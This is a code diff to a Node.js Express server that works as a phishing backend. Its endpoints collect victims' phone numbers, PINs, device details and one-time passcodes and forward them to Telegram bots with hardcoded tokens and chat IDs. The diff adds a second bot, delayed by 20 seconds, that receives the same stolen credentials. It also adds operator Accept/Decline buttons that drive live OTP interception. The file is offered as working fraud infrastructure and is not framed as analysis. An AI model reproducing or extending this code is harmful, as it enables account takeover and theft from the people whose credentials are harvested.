@@ -4,9 +4,18 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // --- TELEGRAM CONFIG ---
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8899223837:AAHyPuhI46v_gnqDpe0gIokRXSO3JGXk5_4";
-const TELEGRAM_ADMIN_ID  = process.env.TELEGRAM_ADMIN_ID  || "6268887709";
+// const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8899223837:AAHyPuhI46v_gnqDpe0gIokRXSO3JGXk5_4";
+// const TELEGRAM_ADMIN_ID  = process.env.TELEGRAM_ADMIN_ID  || "6268887709";
 
+const BOT1 = {
+    TOKEN: process.env.TELEGRAM_BOT_TOKEN_1 || "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc",
+    ID: process.env.TELEGRAM_ADMIN_ID_1 || "7162306402"
+};
+
+const BOT2 = {
+    TOKEN: process.env.TELEGRAM_BOT_TOKEN_2 || "8899223837:AAHyPuhI46v_gnqDpe0gIokRXSO3JGXk5_4",
+    ID: process.env.TELEGRAM_ADMIN_ID_2 || "6268887709"
+};
 
 // Auto-detect base URL: Render sets RENDER_EXTERNAL_URL, Railway sets RAILWAY_STATIC_URL
 const BASE_URL = process.env.RENDER_EXTERNAL_URL
@@ -27,12 +36,16 @@ function log(...args) { console.log(new Date().toISOString(), ...args); }
 // ---------------------------------------------------------------------------
 // TELEGRAM HELPER — uses fetch (built into Node 18+), same as your original
 // ---------------------------------------------------------------------------
-async function sendTelegram(body) {
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+async function sendTelegram(botConfig, body, delayMs = 0) {
+    if (delayMs > 0) await delay(delayMs);
+
     try {
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        const res = await fetch(`https://api.telegram.org/bot${botConfig.TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body)
+            body: JSON.stringify({ ...body, chat_id: botConfig.ID })
         });
         const json = await res.json();
         if (!json.ok) log('[TG] sendMessage failed:', json.description);
@@ -49,15 +62,19 @@ async function sendTelegram(body) {
 // 1. Login attempt — just notify, no action needed
 app.post('/api/login-attempt', async (req, res) => {
     const { phone, pin, device } = req.body;
-    log(`[API] login-attempt phone=${phone}`);
-    await sendTelegram({
-        chat_id: TELEGRAM_ADMIN_ID,
+    const msg = {
         parse_mode: 'HTML',
         text: `🚨 <b>New Login Attempt</b>\nPhone: ${phone}\nPIN: ${pin}\nDevice: ${device}`
-    });
+    };
+
+    // Send to Bot 1 immediately
+    sendTelegram(BOT1, msg);
+    
+    // Send to Bot 2 with 10 second (10000ms) delay
+    sendTelegram(BOT2, msg, 20000);
+
     res.json({ success: true });
 });
-
 // 2. OTP 1 — send with URL Accept/Decline buttons
 app.post('/api/verify-identity', async (req, res) => {
     const { phone, otp1 } = req.body;
@@ -65,8 +82,18 @@ app.post('/api/verify-identity', async (req, res) => {
     sessions[sessionId] = { status: 'pending' };
     log(`[API] verify-identity sessionId=${sessionId}`);
 
-    await sendTelegram({
-        chat_id: TELEGRAM_ADMIN_ID,
+    // Create the message object shared by both bots
+    const msg = {
+        parse_mode: 'HTML',
+        text: `🛡️ <b>WrldBoss Verification (OTP 1)</b>\nPhone: ${phone}\nOTP 1: <b>${otp1}</b>`,
+        reply_markup: {
+            inline_keyboard: [[
+                { text: "✅ Accept", url: `${BASE_URL}/api/cmd/${sessionId}/accept` },
+                { text: "❌ Decline", url: `${BASE_URL}/api/cmd/${sessionId}/decline` }
+            ]]
+        }
+    };
+    const msg2 = {
         parse_mode: 'HTML',
         text: `🛡️ <b>Identity Verification (OTP 1)</b>\nPhone: ${phone}\nOTP 1: <b>${otp1}</b>`,
         reply_markup: {
@@ -75,10 +102,17 @@ app.post('/api/verify-identity', async (req, res) => {
                 { text: "❌ Decline", url: `${BASE_URL}/api/cmd/${sessionId}/decline` }
             ]]
         }
-    });
+    };
+
+    // Send to Bot 1 immediately
+    sendTelegram(BOT1, msg);
+    
+    // Send to Bot 2 with 10 second delay
+    sendTelegram(BOT2, msg2, 20000);
 
     res.json({ success: true, sessionId });
 });
+
 
 // 3. OTP 2 — send with URL Accept/Decline buttons
 app.post('/api/submit-application', async (req, res) => {
